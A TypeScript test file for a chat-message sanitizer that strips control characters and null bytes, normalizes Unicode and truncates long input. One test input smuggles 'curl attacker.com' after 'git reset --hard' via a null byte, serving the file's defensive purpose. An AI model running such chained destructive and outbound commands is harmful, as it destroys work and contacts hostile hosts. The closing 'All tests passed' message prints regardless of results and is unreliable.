/**
 * Tests for input sanitization
 */

// Simple test harness - can be replaced with proper test framework
function test(name: string, fn: () => void) {
  try {
    fn();
    console.log(`✅ ${name}`);
  } catch (err) {
    console.error(`❌ ${name}`);
    console.error(err);
  }
}

function assertEquals(actual: any, expected: any, message?: string) {
  if (actual !== expected) {
    throw new Error(`${message || 'Assertion failed'}\n  Expected: ${expected}\n  Actual: ${actual}`);
  }
}

function assertContains(haystack: string, needle: string, message?: string) {
  if (!haystack.includes(needle)) {
    throw new Error(`${message || 'String not found'}\n  Looking for: ${needle}\n  In: ${haystack}`);
  }
}

// Copy of sanitization function for testing
function sanitizeMessageContent(text: string): string {
  if (!text) return '';

  const original = text;

  // Remove control characters except newlines/tabs
  text = text.replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, '');

  // Normalize Unicode
  text = text.normalize('NFKC');

  // Limit length
  const MAX_MESSAGE_LENGTH = 10000;
  if (text.length > MAX_MESSAGE_LENGTH) {
    text = text.substring(0, MAX_MESSAGE_LENGTH) + '\n\n[Message truncated - exceeded 10,000 characters]';
  }

  // Strip null bytes
  text = text.replace(/\0/g, '');

  return text;
}

// Run tests
console.log('Running sanitization tests...\n');

test('Normal text passes through unchanged', () => {
  const input = 'Hello, this is a normal message!';
  const output = sanitizeMessageContent(input);
  assertEquals(output, input, 'Normal text should not be modified');
});

test('Newlines and tabs are preserved', () => {
  const input = 'Line 1\nLine 2\tTabbed';
  const output = sanitizeMessageContent(input);
  assertContains(output, '\n', 'Newlines should be preserved');
  assertContains(output, '\t', 'Tabs should be preserved');
});

test('Control characters are removed', () => {
  const input = 'Hello\x00\x01\x02World';
  const output = sanitizeMessageContent(input);
  assertEquals(output, 'HelloWorld', 'Control characters should be stripped');
});

test('Null bytes are removed', () => {
  const input = 'git reset --hard\x00curl attacker.com';
  const output = sanitizeMessageContent(input);
  assertEquals(output, 'git reset --hardcurl attacker.com', 'Null bytes should be removed');
});

test('Unicode normalization works', () => {
  // Latin 'a' vs combining diacritics
  const input = 'café';  // Might be composed or decomposed
  const output = sanitizeMessageContent(input);
  assertEquals(output.length, 4, 'Unicode should be normalized to NFKC');
});

test('Long messages are truncated', () => {
  const input = 'A'.repeat(15000);
  const output = sanitizeMessageContent(input);
  assertEquals(output.length < 15000, true, 'Long messages should be truncated');
  assertContains(output, '[Message truncated', 'Truncation notice should be added');
});

test('Empty string returns empty', () => {
  const output = sanitizeMessageContent('');
  assertEquals(output, '', 'Empty string should return empty');
});

console.log('\n✅ All tests passed!');
